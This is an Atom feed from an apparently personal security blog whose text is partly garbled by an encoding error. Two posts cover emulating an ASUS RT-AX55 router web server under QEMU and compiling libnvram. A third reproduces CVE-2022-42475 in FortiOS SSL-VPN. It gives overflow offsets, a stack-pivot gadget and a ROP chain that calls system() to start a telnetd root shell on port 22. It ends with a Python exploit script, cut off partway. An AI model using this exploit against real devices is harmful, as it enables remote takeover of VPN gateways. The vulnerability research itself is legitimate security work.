<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ioo0s&#39;s blog</title>
  
  
  <link href="http://ioo0s.art/atom.xml" rel="self"/>
  
  <link href="http://ioo0s.art/"/>
  <updated>2023-02-20T02:03:17.003Z</updated>
  <id>http://ioo0s.art/</id>
  
  <author>
    <name>ios</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RT-AX55ç¯å¢ƒæ­å»º</title>
    <link href="http://ioo0s.art/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://ioo0s.art/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2023-02-20T01:59:59.000Z</published>
    <updated>2023-02-20T02:03:17.003Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å¯åŠ¨æ–¹å¼"><a href="#å¯åŠ¨æ–¹å¼" class="headerlink" title="å¯åŠ¨æ–¹å¼"></a>å¯åŠ¨æ–¹å¼</h2><h3 id="æ–¹å¼ä¸€"><a href="#æ–¹å¼ä¸€" class="headerlink" title="æ–¹å¼ä¸€"></a>æ–¹å¼ä¸€</h3><pre><code>sudo chroot . ./qemu-arm-static -E LD_PRELOAD=&quot;./libnvram.so&quot; ./usr/sbin/httpd</code></pre><span id="more"></span><h3 id="æ–¹å¼äºŒ"><a href="#æ–¹å¼äºŒ" class="headerlink" title="æ–¹å¼äºŒ"></a>æ–¹å¼äºŒ</h3><ol><li>å¤åˆ¶ qemu-arm-static åˆ° squashfs-root ä¸­</li></ol><pre><code>where qemu-arm-staticcp /usr/bin/qemu-arm-static ./squashfs-root/</code></pre><ol><li>å¯åŠ¨</li></ol><pre><code>cd squashfs-rootsudo chroot . ./qemu-arm-static ./usr/sbin/httpd</code></pre><h3 id="å¯åŠ¨æ—¶çš„é”™è¯¯å¤„ç†"><a href="#å¯åŠ¨æ—¶çš„é”™è¯¯å¤„ç†" class="headerlink" title="å¯åŠ¨æ—¶çš„é”™è¯¯å¤„ç†"></a>å¯åŠ¨æ—¶çš„é”™è¯¯å¤„ç†</h3><h4 id="é‡è§-openssl-ç›¸å…³é”™è¯¯"><a href="#é‡è§-openssl-ç›¸å…³é”™è¯¯" class="headerlink" title="é‡è§ openssl ç›¸å…³é”™è¯¯"></a>é‡è§ openssl ç›¸å…³é”™è¯¯</h4><p>é”™è¯¯åŸå› ä»£ç ï¼š</p><p>è¿è¡Œ gencert.sh</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnvKJ5i51SRuJqtb1UGIJabf.png"></p><p>åœ¨è°ƒç”¨ nvram ç›¸å…³å‘½ä»¤æ—¶å‡ºé”™ï¼ŒåŸå› ä¸å­˜åœ¨ nvram</p><pre><code>#!/bin/shSECS=1262278080cd /etcNVCN=`nvram get https_crt_cn`if [ &quot;$NVCN&quot; == &quot;&quot; ]; then        NVCN=&quot;router.asus.com&quot;ficp -L openssl.cnf openssl.configI=0for CN in $NVCN; do        echo &quot;$I.commonName=CN&quot; &gt;&gt; openssl.config        echo &quot;$I.commonName_value=$CN&quot; &gt;&gt; openssl.config        I=$(($I + 1))done........ ä»¥ä¸Šæ˜¯éƒ¨åˆ†ä»£ç </code></pre><p>æŠ¥é”™æˆªå›¾ï¼š</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnl3dulqHfHWoU4hPu8AxK6c.png"></p><h5 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h5><p>nvram ä¸­ä¿å­˜äº†è®¾å¤‡çš„ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œè€Œç¨‹åºè¿è¡Œæ—¶éœ€è¦è¯»å–é…ç½®ä¿¡æ¯ï¼Œç”±äºç¼ºå°‘å¯¹åº”çš„å¤–è®¾ï¼Œå› æ­¤ä¼šæŠ¥é”™ã€‚è¦ç¼–è¯‘ nvram æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ Firmadyne æä¾›çš„ libnvram åº“ï¼Œå› ä¸ºå…¶æ”¯æŒå¾ˆå¤šçš„ apiã€‚</p><p><a href="https://ioo0s.art/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/">libnvram.so ç¼–è¯‘</a></p><h4 id="libnvram-è¿è¡Œä¸­å…¶ä»–é”™è¯¯"><a href="#libnvram-è¿è¡Œä¸­å…¶ä»–é”™è¯¯" class="headerlink" title="libnvram è¿è¡Œä¸­å…¶ä»–é”™è¯¯"></a>libnvram è¿è¡Œä¸­å…¶ä»–é”™è¯¯</h4><p>è¿è¡Œåï¼Œå‘ç°ä»ç„¶ç¼ºå°‘ä¸€äº›é”®å€¼å¯¹ï¼Œ</p><p>é”™è¯¯æˆªå›¾ï¼š</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcndvxlJcQMG25ouQzRdwrwSc.png"></p><h5 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h5><p>è¿”å›ä¿®æ”¹ libnvarm çš„ config.h æ–‡ä»¶æ·»åŠ å¯¹åº”çš„é”®å€¼å¯¹</p><p>é€šè¿‡ ida ä¸­ strings æœç´¢å¯¹åº”çš„ key è¿›è¡Œ value çš„æŸ¥æ‰¾</p><p>time_zone_x</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnCanMJ27GB8hlgZsJuAcWfc.png"></p><p>value</p><pre><code>PST8PDT</code></pre><p>HTTPD_DBG</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnHLGlcIPJuI1HotrIZhMaIe.png"></p><p>Value</p><pre><code>0 or 1</code></pre><p>https_crt_gen</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnDlsWW2oaMlwoBYKuiNJvS0.png"></p><p>Value</p><pre><code>0 or 1</code></pre><p>https_crt_save</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcn2qNTiJLAlCDobc2IIyOR1c.png"></p><p>Value</p><pre><code>0 or 1</code></pre><p>ä¿®æ”¹å</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnaD7h9vCpuz7WOzzM80upwf.png"></p><h4 id="nvram-init-Unable-to-touch-Ralink-PID-file-var-run-nvramd-pid"><a href="#nvram-init-Unable-to-touch-Ralink-PID-file-var-run-nvramd-pid" class="headerlink" title="nvram_init: Unable to touch Ralink PID file: /var/run/nvramd.pid!"></a>nvram_init: Unable to touch Ralink PID file: /var/run/nvramd.pid!</h4><p>é”™è¯¯æˆªå›¾ï¼š</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnTpbPxxZFdfeOvlEs05gjJh.png"></p><h5 id="è§£å†³æ–¹æ³•-1"><a href="#è§£å†³æ–¹æ³•-1" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h5><p>æ‰‹åŠ¨ touch ä¸€ä¸ªæ–‡ä»¶è¿›å»</p><pre><code>touch var/run/nvramd.pid</code></pre><h4 id="cp-canâ€™t-stat-â€˜-mnt-libnvram-override-â€™-No-such-file-or-directory"><a href="#cp-canâ€™t-stat-â€˜-mnt-libnvram-override-â€™-No-such-file-or-directory" class="headerlink" title="cp: canâ€™t stat â€˜/mnt/libnvram.override/*â€™: No such file or directory"></a>cp: canâ€™t stat â€˜/mnt/libnvram.override/*â€™: No such file or directory</h4><p>ä¸€æ ·åˆ›å»ºä¸€ä¸ª</p><pre><code>mkdir mnt/libnvram.override</code></pre><h4 id="ssl-ç›¸å…³é”™è¯¯ï¼Œä¾‹å¦‚-lib-2-func-1-reason-2-NA-0-fopen-â€˜-etc-cert-pemâ€™-â€™râ€™-ç­‰ä¸€ç³»åˆ—é—®é¢˜"><a href="#ssl-ç›¸å…³é”™è¯¯ï¼Œä¾‹å¦‚-lib-2-func-1-reason-2-NA-0-fopen-â€˜-etc-cert-pemâ€™-â€™râ€™-ç­‰ä¸€ç³»åˆ—é—®é¢˜" class="headerlink" title="ssl ç›¸å…³é”™è¯¯ï¼Œä¾‹å¦‚ lib(2):func(1):reason(2):NA:0:fopen(â€˜/etc/cert.pemâ€™,â€™râ€™) ç­‰ä¸€ç³»åˆ—é—®é¢˜"></a>ssl ç›¸å…³é”™è¯¯ï¼Œä¾‹å¦‚ lib(2):func(1):reason(2):NA:0:fopen(â€˜/etc/cert.pemâ€™,â€™râ€™) ç­‰ä¸€ç³»åˆ—é—®é¢˜</h4><h5 id="è§£å†³æ–¹æ³•-2"><a href="#è§£å†³æ–¹æ³•-2" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h5><p>æ ¹æ®é”™è¯¯æœç´¢/etc/cert.pem</p><p><img src="/2023/02/20/RT-AX55%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/boxcnMx8s3873k7745ii1x40hmd.png"></p><p>é€šè¿‡åˆ†æä¸Šä¸‹æ–‡ + æœ¬åœ°æ–‡ä»¶ç”Ÿæˆå¯ä»¥çŸ¥é“ï¼Œè„šæœ¬ gencert.sh å¹¶æ²¡æœ‰è‰¯å¥½å·¥ä½œï¼Œéœ€è¦æˆ‘ä»¬åœ¨æœ¬åœ°åˆ©ç”¨ openssl ç”Ÿæˆå¯¹åº”çš„æ–‡ä»¶å¹¶ copy åˆ° etc æ–‡ä»¶å¤¹ä¸‹å³å¯</p><ol><li>ç”Ÿæˆ privkey.pem åŠ cert.csr</li></ol><pre><code>openssl req -new -out /tmp/cert.csr -keyout /tmp/privkey.pem -newkey rsa:2048 -passout pass:password</code></pre><ol><li>ç”Ÿæˆ key.pem</li></ol><pre><code>openssl rsa -in /tmp/privkey.pem -out key.pem -passin pass:password</code></pre><ol><li>ç”Ÿæˆ cert.pem</li></ol><pre><code>RANDFILE=/dev/urandom openssl req -x509 -new -nodes -in /tmp/cert.csr -key key.pem -days 3653 -sha256 -out cert.pem</code></pre><ol><li>ç”Ÿæˆ server.pem</li></ol><pre><code>cat key.pem cert.pem &gt; server.pem</code></pre><ol><li>å¤åˆ¶åˆ°/tmp/etc/ä¸‹</li></ol><pre><code>cp server.pem cert.pem cert.crt key.pem ./tmp/etc</code></pre><p>å†æ¬¡è¿è¡Œ æå®š</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å¯åŠ¨æ–¹å¼&quot;&gt;&lt;a href=&quot;#å¯åŠ¨æ–¹å¼&quot; class=&quot;headerlink&quot; title=&quot;å¯åŠ¨æ–¹å¼&quot;&gt;&lt;/a&gt;å¯åŠ¨æ–¹å¼&lt;/h2&gt;&lt;h3 id=&quot;æ–¹å¼ä¸€&quot;&gt;&lt;a href=&quot;#æ–¹å¼ä¸€&quot; class=&quot;headerlink&quot; title=&quot;æ–¹å¼ä¸€&quot;&gt;&lt;/a&gt;æ–¹å¼ä¸€&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;sudo chroot . ./qemu-arm-static -E LD_PRELOAD=&amp;quot;./libnvram.so&amp;quot; ./usr/sbin/httpd
&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="åŸºç¡€çŸ¥è¯†" scheme="http://ioo0s.art/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="ASUS" scheme="http://ioo0s.art/tags/ASUS/"/>
    
  </entry>
  
  <entry>
    <title>libnvram.soç¼–è¯‘æ•™ç¨‹</title>
    <link href="http://ioo0s.art/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/"/>
    <id>http://ioo0s.art/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/</id>
    <published>2023-02-20T01:29:15.000Z</published>
    <updated>2023-02-20T01:37:54.787Z</updated>
    
    <content type="html"><![CDATA[<ol><li>ä½¿ç”¨äº¤å‰ç¼–è¯‘ç¯å¢ƒ</li><li>è¿›è¡Œç¬¦å·é“¾æ¥é…ç½®</li></ol><pre><code>sudo ln -s ~/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3 /opt/brcm-armecho &quot;PATH=\$PATH:/opt/brcm-arm/bin&quot; &gt;&gt; ~/.profilesource ~/.profile</code></pre><span id="more"></span><ol><li>ä¸‹è½½ libnvram é¡¹ç›®</li><li>é…ç½®ç¼–è¯‘ç›¸å…³ä¾èµ–</li></ol><pre><code>export CC=arm-uclibc-gcc&lt;em&gt;export LD_LIBRARY_PATH=$&#123;LD_LIBRARY_PATH&#125;:/opt/brcm-arm/lib:/usr/local/lib:/usr/lib&lt;/em&gt;</code></pre><ol start="5"><li>ä½¿ç”¨ ldd å‘½ä»¤æŸ¥çœ‹ä¾èµ–æ˜¯å¦è¡¥å…¨</li></ol><pre><code>ldd arm-uclibc-gcc</code></pre><p><img src="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/boxcnI29TiwEnChYepLkxqsjkuh.png"></p><p>å‘ç°è¿˜ç¼ºå°‘ libelf åº“ï¼Œ<strong>32 ä½ç‰ˆæœ¬</strong></p><ol><li>å¯¹ kali æ·»åŠ  32 æ¶æ„æ”¯æŒ</li></ol><pre><code>sudo dpkg --add-architecture i386sudo apt update</code></pre><ol><li>å®‰è£… libelf1:i386</li></ol><pre><code>sudo apt-get install libelf1:i386</code></pre><ol><li>ä¿®æ”¹ config.h ä¸­çš„é…ç½®æ–‡ä»¶</li></ol><p>ä¸ºäº†åˆå§‹åŒ– nvram æ—¶èƒ½å¤Ÿæ­£ç¡®çš„é…ç½®ä¿¡æ¯ï¼Œéœ€è¦å¯¹ config.h ä¿®æ”¹</p><p>ä¿®æ”¹å›¾ä¸­å‚æ•°ä¸º eth0 ç½‘å¡ ip åœ°å€ä¸å¹¿æ’­åœ°å€</p><p><img src="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/boxcnCoz7jxnEDvRcZTXUGqy4Wc.png"></p><p>ä¿®æ”¹æŒ‚è½½ç‚¹ï¼Œä¿®æ”¹åéœ€è¦åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºç›®å½• <code>mkdir ./mnt/libnvram</code></p><p><img src="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/boxcnGvWyu3Hn0fgI6TQfz5oSmb.png"></p><p>å¦‚æœéœ€è¦åŠ å…¶ä»– nvram çš„å¯åŠ¨é…ç½®å‚æ•°ï¼Œä¹Ÿåœ¨è¿™é‡Œè¿›è¡Œæ·»åŠ </p><ol><li>å°è¯•ç¼–è¯‘</li></ol><pre><code>make</code></pre><p><img src="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/boxcntGWsN5d5TDcqxPCjIHaGRh.png"></p><p>æç¤ºä¸€ä¸ª warning</p><ol><li>ä¿®æ”¹ Makefileï¼Œæ·»åŠ  gnuï¼Œä¿®å¤ warning</li></ol><pre><code>-D_GNU_SOURCE</code></pre><p><img src="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/boxcn7Kw93iKU1n89tekpUgJ9Uf.png"></p><p>9.å†æ¬¡ç¼–è¯‘ï¼Œå¤§åŠŸå‘Šæˆ</p><p><img src="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/boxcndV2iixPchqAVePmZz7c6Be.png"></p>]]></content>
    
    
    <summary type="html">&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨äº¤å‰ç¼–è¯‘ç¯å¢ƒ&lt;/li&gt;
&lt;li&gt;è¿›è¡Œç¬¦å·é“¾æ¥é…ç½®&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;sudo ln -s ~/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3 /opt/brcm-arm
echo &amp;quot;PATH=\$PATH:/opt/brcm-arm/bin&amp;quot; &amp;gt;&amp;gt; ~/.profile
source ~/.profile
&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="åŸºç¡€çŸ¥è¯†" scheme="http://ioo0s.art/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="ASUS" scheme="http://ioo0s.art/tags/ASUS/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-42475</title>
    <link href="http://ioo0s.art/2023/02/09/CVE-2022-42475/"/>
    <id>http://ioo0s.art/2023/02/09/CVE-2022-42475/</id>
    <published>2023-02-09T03:24:40.000Z</published>
    <updated>2023-02-09T05:10:47.206Z</updated>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆéœ€è¦è¿›è¡Œç¯å¢ƒæ­å»ºå‚è€ƒ<a href="https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/">è·å– shell è¿›é˜¶</a></p><p>ä»¥åŠè°ƒè¯•ç¯å¢ƒæ­å»º <a href="https://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/">gdb-server é…ç½®</a></p><h2 id="å¤ç°è¿‡ç¨‹"><a href="#å¤ç°è¿‡ç¨‹" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h2><p>æ ¹æ®æ–‡ç«  <a href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">https://wzt.ac.cn/2022/12/15/CVE-2022-42475/</a>ï¼Œå¯ä»¥å¿«é€Ÿå®šä½åˆ°å¯æ§åˆ¶çš„æº¢å‡ºç‚¹ï¼Œä½†æ˜¯ä¸åŒç¯å¢ƒçš„åŸå›  è²Œä¼¼æº¢å‡ºç‚¹åœ°å€æœ‰å˜ï¼Œä¾‹å¦‚æˆ‘ init ä¸­åœ¨ <code>0000000001780BFB</code></p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnX7t3Jx1WBzLwCgC1CWlFYf.png"></p><p>è°ƒè¯• exp æ—¶å»ºè®®åœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ï¼Œä¸æ˜¯ç™¾åˆ†ç™¾è§¦å‘è¯¥ä½ç½®ï¼Œå› ä¸ºæœ‰æ—¶ä¼šè¦†ç›–åˆ°å…¶ä»– ç»“æ„ä½ç½® åœ¨èµ‹å€¼æ—¶å¯¼è‡´é”™è¯¯ã€‚</p><span id="more"></span><ol><li>ç¡®å®šæº¢å‡ºåç§»</li></ol><p>ä¸ºäº†å¿«é€Ÿç¡®å®šåç§»ï¼Œè¿™é‡Œå»ºè®®ç”¨ peda çš„ pattern ç”Ÿæˆ Payload è¿›è¡Œè§¦å‘</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcntv3SPMSPz4RcHJJPCKzQZb.png"></p><p>æ¥ç€å½“æ–­ç‚¹è§¦å‘åœ¨ jmp rax çš„æ—¶å€™ï¼ŒæŸ¥çœ‹å½“å‰ rax çš„å€¼è®¡ç®— offsetï¼Œé€šè¿‡å¤§é‡æµ‹è¯•åŸºæœ¬ä¼šå­˜åœ¨ä¸¤ç§æƒ…å†µåç§»ä¼šè§¦å‘åˆ° jmp raxï¼Œ</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnHQAyBPb7XieHeSWb6b8W0d.png"></p><p>åˆ†åˆ«æ˜¯ 2592,1568ï¼Œå¹¶ä¸” 2592 åç§»è§¦å‘å‡ ç‡å¤§äº 1568ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥çš„ exp æ„é€ å‡åœ¨ 2592 å¤„ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ 2592+payload æ¥æ§åˆ¶è·³è½¬äº†</p><ol><li>æ ˆè¿ç§»</li></ol><p>ç”±äºæ­¤æ—¶æ˜¯å †æº¢å‡ºï¼Œåªèƒ½æ§åˆ¶ä¸€æ¬¡è·³è½¬ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨æ ˆè¿ç§»å°†æ ˆåœ°å€ç§»åŠ¨åˆ°æˆ‘ä»¬å¯æ§çš„ä½ç½®ï¼Œé€šè¿‡å¯„å­˜å™¨ä¿¡æ¯å¯ä»¥çŸ¥é“ç›®å‰è¢«æº¢å‡ºçš„ä½ç½®æœ‰ä»¥ä¸‹å‡ ä¸ªå¯„å­˜å™¨ï¼ŒRAX ç”¨æ¥æ ˆè¿ç§»ï¼ŒRDX å¯æ§ï¼Œå†…å®¹æ˜¯æº¢å‡ºçš„å­—ç¬¦ï¼ˆæˆªå›¾æ˜¯ exp æ„é€ åçš„ï¼‰ï¼ŒR11 å¯æ§ï¼Œå†…å®¹æ˜¯æº¢å‡ºå­—ç¬¦ã€‚</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcniOyqoX4kN3oYHpK17GwApf.png"></p><p>æ‰€ä»¥æˆ‘ä»¬ç›®æ ‡æ˜¯æ‰¾åˆ°ç±»ä¼¼ push RDXï¼Œpop rsp æˆ– push r11ï¼Œpop rsp çš„ gadgetã€‚æ¥ç€é€šè¿‡ ropgadget ç”Ÿæˆæ‰€æœ‰çš„ gadget å¹¶è¾“å‡ºåˆ°æ–‡æœ¬ï¼ˆä½ é—®æˆ‘ä¸ºå•¥ä¸ç›´æ¥æŸ¥æ‰¾ï¼Ÿå¡åˆ°çˆ†ï¼ï¼ï¼ï¼‰</p><p>æ¥ç€åˆ©ç”¨å‘½ä»¤å…³è”æœç´¢ <code>cat gadget.txt| grep &quot;push rdx&quot;| grep &quot;pop rsp&quot;</code></p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnTPsrxcyBOGd3IJeKFUVvMd.png"></p><p>å‘ç°æœ‰ä¸€ä¸ªæ¯”è¾ƒç¬¦åˆçš„ <code>0x000000000140583a : push rdx ; pop rsp ; add edi, edi ; nop ; ret</code></p><p>æ¥ç€æˆ‘ä»¬å°±èƒ½å°†æ ˆè¿ç§»åˆ°åˆ° rdx æ‰€æŒ‡çš„å†…å­˜å¤„äº†</p><ol><li>è®¡ç®— rdx å¯æ§åç§»</li></ol><p>é‚£æ­¤å¤„è®¡ç®—æ–¹å¼å°±å’Œä¸Šæ–¹ä¸€è‡´äº†ï¼Œé€šè¿‡å†æ¬¡åˆ©ç”¨ pattern è¿›è¡Œæº¢å‡ºï¼Œå¹¶è®¡ç®— rdx å¤„çš„åç§»ï¼Œé€šè¿‡è®¡ç®—å¾—åˆ°åç§»ä¸º 2400</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcn4hNGUQXG3rPlMPHmrIc9Se.png"></p><ol><li>æ„é€  exp</li></ol><p>æ­¤æ—¶ rdx å†…å­˜å¤„å¯æ§ï¼Œæ­£å¼å¼€å§‹æ„é€  expï¼Œç›®å‰çš„ exp æ˜¯åŸºäº busybox çš„ï¼Œä¸æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ expï¼Œä½†æ˜¯ä¹Ÿæ˜¯ä¸€æ ·çš„è¯æ˜äº†å¯ä»¥ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><pre><code>gadget1 = 0x000000000140583a #        payload = b&quot;B&quot;*2400        #payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # : pop rax ; ret        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret        payload += int_to_bytes(0x58) + b&quot;\x00&quot;*7 # sell offset        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 #push rdx; pop rdi; ret;        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5# : pop rsi ; ret        payload += b&quot;\x00&quot;*8 # sell offset 0        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5# : pop rdx ; ret        payload += b&quot;\x00&quot;*8 # sell offset 0        payload += int_to_bytes(0x5693D5) + b&quot;\x00&quot;*5 # call system        payload += b&quot;/bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&quot;+b&quot;\x00&quot;*8        raw = payload+b&quot;A&quot;*(2592-len(payload))        raw += int_to_bytes(gadget1)</code></pre><p>ç®€å•è®²è§£ä¸€ä¸‹ payloadï¼Œé¦–å…ˆæ˜¯ pop rax ç”¨å¤„æ˜¯ å­˜æ”¾è·ç¦»å‘½ä»¤å­—ç¬¦ä¸²çš„åç§»é‡ï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡è°ƒè¯•ä¹Ÿèƒ½å¾—åˆ°ã€‚</p><p>è¿™é‡Œç”±äºè°ƒè¯•æ—¶å‘ç°ä¼šåœ¨æ ˆä¸­å¤šå‡ºä¸ª 1 å¯¼è‡´ pop raxï¼›ret åæ‰§è¡Œåœ°å€ 1 å‡ºç°é”™è¯¯ï¼Œæ‰€ä»¥éœ€è¦æ‰¾ä¸€ä¸ª pop rax åæ—© pop æŸä¸ªå¯„å­˜å™¨è®©è¿™ä¸ª 1 å‡ºæ ˆï¼Œæœ€ç»ˆæ‰¾åˆ°äº† pop rax ; pop rcx ; retï¼Œä¸ä¼šå½±å“å…¶ä»– gadgetã€‚</p><p>æ¥ç€è°ƒè¯•æ—¶å‘ç°äº†ä¸€äº›æ ˆä¸å¹³è¡¡çš„é—®é¢˜ï¼Œåˆ©ç”¨ä¸€äº› junk gadget ç”¨æ¥è¡¥é½æ ˆ</p><p>æ¥ç€ add rdx, rax å¾—åˆ°å‘½ä»¤å­—ç¬¦ä¸²çš„åœ°å€ï¼Œå¹¶å­˜åœ¨ rdx ä¸­</p><p>æœ€åæ„é€  system(cmd,0,0);è¿›è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œè¿™é‡Œæ³¨æ„éœ€è¦æ§åˆ¶çš„ä¸‰ä¸ªå¯„å­˜å™¨ rdiã€rsiã€rdx</p><p>æŸ¥çœ‹ä¸€ä¸‹æ„é€  system å‰çš„å¯„å­˜å™¨å’Œæ ˆç©ºé—´</p><p><img src="/2023/02/09/CVE-2022-42475/static/boxcnHOcQXZ6bFQlNt1BR523wuf.png"></p><ol><li>å¤šæ¬¡å‘é€ payload åä¼šå¤šå‡ºä¸€ä¸ªè¿›ç¨‹å¼€åœ¨ 22 ç«¯å£ï¼Œé€šè¿‡ telnet è¿æ¥ä¸Šå»æˆåŠŸè·å¾— shell</li></ol><p><img src="/2023/02/09/CVE-2022-42475/static/boxcn8zAekllzjKNxyc7nZH4fhh.png"></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><pre><code>import socketimport sslfrom struct import packdef int_to_bytes(n, minlen=0):    &quot;&quot;&quot; Convert integer to bytearray with optional minimum length.     &quot;&quot;&quot;    if n &gt; 0:        arr = []        while n:            n, rem = n &gt;&gt; 8, n &amp; 0xff            arr.append(rem)        b = bytearray(arr)    elif n == 0:        b = bytearray(b&#39;\x00&#39;)    else:        raise ValueError(&#39;Only non-negative values supported&#39;)    if minlen &gt; 0 and len(b) &lt; minlen: # zero padding needed?        b = (minlen-len(b)) * &#39;\x00&#39; + b    return bpath = &quot;/remote/login&quot;.encode()id = 0while True:    print(&quot;#&quot;+str(id))    #access mem addr 0x164e000 - 0x17a1fff    CL=0x1b00000000    # push rdx ; pop rsp ; add edi, edi ; nop ; ret    gadget1 = 0x000000000140583a    try:        payload = b&quot;B&quot;*2400        #payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # : pop rax ; ret        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret        payload += int_to_bytes(0x58) + b&quot;\x00&quot;*7 # sell offset        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 #push rdx; pop rdi; ret;        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5# : pop rsi ; ret        payload += b&quot;\x00&quot;*8 # sell offset 0        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5# : pop rdx ; ret        payload += b&quot;\x00&quot;*8 # sell offset 0        payload += int_to_bytes(0x5693D5) + b&quot;\x00&quot;*5 # call system        payload += b&quot;/bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&quot;+b&quot;\x00&quot;*8        raw = payload+b&quot;A&quot;*(2592-len(payload))        raw += 